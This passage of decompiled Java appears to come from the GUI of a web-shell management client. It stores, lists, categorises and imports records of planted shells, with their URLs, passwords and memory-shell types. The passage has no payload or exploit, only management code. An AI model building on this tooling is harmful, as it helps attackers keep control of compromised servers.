         return Constants.MEMSHELL_TYPE_FILTER;
      } else {
         return type.equals("Servlet") ? Constants.MEMSHELL_TYPE_SERVLET : Constants.MEMSHELL_TYPE_FILE;
      }
   }

   private void addShell(JSONObject shellEntity) throws Exception {
      String url = Utils.getOrDefault(shellEntity, "url", String.class);
      String password = Utils.getOrDefault(shellEntity, "password", String.class);
      String type = Utils.getOrDefault(shellEntity, "type", String.class);
      String catagory = Utils.getOrDefault(shellEntity, "catagory", String.class);
      String os = Utils.getOrDefault(shellEntity, "os", String.class);
      String comment = Utils.getOrDefault(shellEntity, "comment", String.class);
      String headers = Utils.getOrDefault(shellEntity, "headers", String.class);
      int status = Integer.parseInt(Utils.getOrDefault(shellEntity, "status", Integer.TYPE));
      int memType = Integer.parseInt(Utils.getOrDefault(shellEntity, "memType", Integer.TYPE));
      this.shellManager.addShell(url, password, type, catagory, os, comment, headers, status, memType);
   }

   private void loadShellList() throws Exception {
      this.searchShellTxt.setText("");
      this.shellListTable.getItems().clear();
      JSONArray shellList = this.shellManager.listShell();
      this.fillShellRows(shellList);
   }

   private void fillShellRows(JSONArray jsonArray) {
      ObservableList data = FXCollections.observableArrayList();

      for(int i = 0; i < jsonArray.length(); ++i) {
         JSONObject rowObj = jsonArray.getJSONObject(i);

         try {
            int id = rowObj.getInt("id");
            String url = rowObj.getString("url");
            String ip = rowObj.getString("ip");
            String type = rowObj.getString("type");
            String os = rowObj.getString("os");
            String comment = rowObj.getString("comment");
            SimpleDateFormat df = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
            String addTime = df.format(new Timestamp(rowObj.getLong("addtime")));
            int status = rowObj.getInt("status");
            int memType = rowObj.getInt("memType");
            List row = new ArrayList();
            row.add(this.COL_INDEX_URL, new SimpleStringProperty(url));
            row.add(this.COL_INDEX_IP, new SimpleStringProperty(ip));
            row.add(this.COL_INDEX_TYPE, new SimpleStringProperty(type));
            row.add(this.COL_INDEX_OS, new SimpleStringProperty(os));
            row.add(this.COL_INDEX_COMMENT, new SimpleStringProperty(comment));
            row.add(this.COL_INDEX_ADDTIME, new SimpleStringProperty(addTime));
            row.add(this.COL_INDEX_STATUS, new SimpleStringProperty(status + ""));
            row.add(this.COL_INDEX_ID, new SimpleStringProperty(id + ""));
            row.add(this.COL_INDEX_MEMTYPE, new SimpleStringProperty(memType + ""));
            data.add(row);
         } catch (Exception var16) {
            var16.printStackTrace();
         }
      }

      this.shellListTable.setItems(data);
   }

   private void copyString(String str) {
      Clipboard clipboard = Clipboard.getSystemClipboard();
      ClipboardContent content = new ClipboardContent();
      content.putString(str);
      clipboard.setContent(content);
   }

   private void showErrorMessage(String title, String msg) {
      Alert alert = new Alert(AlertType.ERROR);
      Window window = alert.getDialogPane().getScene().getWindow();
      window.setOnCloseRequest((event) -> {
         window.hide();
      });
      alert.setTitle(title);
      alert.setHeaderText("");
      alert.setContentText(msg);
      alert.show();
   }

   private void initCatagoryMenu() {
      ContextMenu treeContextMenu = new ContextMenu();
      MenuItem addCatagoryBtn = new MenuItem("新增");
      treeContextMenu.getItems().add(addCatagoryBtn);
      MenuItem delCatagoryBtn = new MenuItem("删除");
      treeContextMenu.getItems().add(delCatagoryBtn);
      addCatagoryBtn.setOnAction((event) -> {
         Alert alert = new Alert(AlertType.CONFIRMATION);
         alert.setTitle("新增分类");
         alert.setHeaderText("");
         GridPane panel = new GridPane();
         Label cataGoryNameLable = new Label("请输入分类名称：");
         TextField cataGoryNameTxt = new TextField();
         Label cataGoryCommentLable = new Label("请输入分类描述：");
         TextField cataGoryCommentTxt = new TextField();
         panel.add(cataGoryNameLable, 0, 0);
         panel.add(cataGoryNameTxt, 1, 0);
         panel.add(cataGoryCommentLable, 0, 1);
         panel.add(cataGoryCommentTxt, 1, 1);
         panel.setVgap(20.0D);
         alert.getDialogPane().setContent(panel);
         Optional result = alert.showAndWait();
         if (result.get() == ButtonType.OK) {
            try {
               if (this.shellManager.addCatagory(cataGoryNameTxt.getText(), cataGoryCommentTxt.getText()) > 0) {
                  this.statusLabel.setText("分类新增完成");
                  this.initCatagoryTree();
               }
            } catch (Exception var10) {
               this.statusLabel.setText("分类新增失败：" + var10.getMessage());
               var10.printStackTrace();
            }
         }

      });
      delCatagoryBtn.setOnAction((event) -> {
         if (this.catagoryTreeView.getSelectionModel().getSelectedItem() != null) {
            Alert alert = new Alert(AlertType.CONFIRMATION);
            alert.setHeaderText("");
            alert.setContentText("请确认是否删除？仅删除分类信息，不会删除该分类下的网站。");
            Optional result = alert.showAndWait();
            if (result.get() == ButtonType.OK) {
               try {
                  String cataGoryName = ((TreeItem)this.catagoryTreeView.getSelectionModel().getSelectedItem()).getValue().toString();
                  if (this.shellManager.deleteCatagory(cataGoryName) > 0) {
                     this.statusLabel.setText("分类删除完成");
                     this.initCatagoryTree();
                  }
               } catch (Exception var5) {
                  this.statusLabel.setText("分类删除失败：" + var5.getMessage());
                  var5.printStackTrace();
               }
            }

         }
      });
      this.catagoryTreeView.setContextMenu(treeContextMenu);
      this.catagoryTreeView.setOnMouseClicked((event) -> {
         TreeItem currentTreeItem = (TreeItem)this.catagoryTreeView.getSelectionModel().getSelectedItem();
         if (currentTreeItem.isLeaf()) {
            String catagoryName = currentTreeItem.getValue().toString();

            try {
               this.shellListTable.getItems().clear();
               JSONArray shellList = this.shellManager.findShellByCatagory(catagoryName);
               this.fillShellRows(shellList);
            } catch (Exception var6) {
               var6.printStackTrace();
            }
         } else {
            try {
               this.shellListTable.getItems().clear();
               this.loadShellList();
            } catch (Exception var5) {
               var5.printStackTrace();
            }
         }

      });
   }

   private void initCatagoryTree() throws Exception {
      JSONArray catagoryList = this.shellManager.listCatagory();
      TreeItem rootItem = new TreeItem("分类列表", new ImageView());

      for(int i = 0; i < catagoryList.length(); ++i) {
         JSONObject catagoryObj = catagoryList.getJSONObject(i);
         TreeItem treeItem = new TreeItem(catagoryObj.getString("name"));
         rootItem.getChildren().add(treeItem);
      }

      rootItem.setExpanded(true);
      this.catagoryTreeView.setRoot(rootItem);
      this.catagoryTreeView.getSelectionModel().select(rootItem);
   }

   private void importData() throws Exception {
      FileChooser fileChooser = new FileChooser();
      fileChooser.setTitle("请选择需要导入的data.db文件");
      File selectdFile = fileChooser.showOpenDialog(this.shellListTable.getScene().getWindow());
      if (selectdFile != null) {
         String dbPath = selectdFile.getAbsolutePath();
         ShellManager oldShellManager = new ShellManager(dbPath);
         JSONArray shells = oldShellManager.listShell();
         Runnable runner = () -> {
            int count = 0;
            int duplicateCount = 0;

            for(int i = 0; i < shells.length(); ++i) {
               JSONObject shellEntity = shells.getJSONObject(i);

               try {
                  final int finalCount = count;
                  Platform.runLater(() -> {
                     this.statusLabel.setText(String.format("正在导入%d/%d...", finalCount, shells.length()));
                  });
                  this.addShell(shellEntity);
                  ++count;
               } catch (Exception var8) {
                  if (var8.getMessage().equals("该URL已存在")) {
                     ++duplicateCount;
                  }
               }
            }

            final int finalDuplicateCount = duplicateCount;
            final int finalCount = count;
            Platform.runLater(() -> {
               this.statusLabel.setText("导入完成。");
               Utils.showInfoMessage("提示", String.format("导入完成，共有%d条数据，%d条数据已存在，新导入%d数据，", shells.length(), finalDuplicateCount, finalCount));

               try {
                  this.loadShellList();
               } catch (Exception var5) {
               }

            });
            oldShellManager.closeConnection();
         };
         Thread worker = new Thread(runner);
         worker.start();
      }
   }

   private String getSelectedShellID() {
      return ((StringProperty)((List)this.shellListTable.getSelectionModel().getSelectedItem()).get(this.COL_INDEX_ID)).getValue();
   }

   private int getShellID(ArrayList item) {
      return Integer.parseInt(((SimpleStringProperty)item.get(this.COL_INDEX_ID)).getValue());
   }

   private String getShellUrl(ArrayList item) {
      return ((SimpleStringProperty)item.get(this.COL_INDEX_URL)).getValue();
   }
}
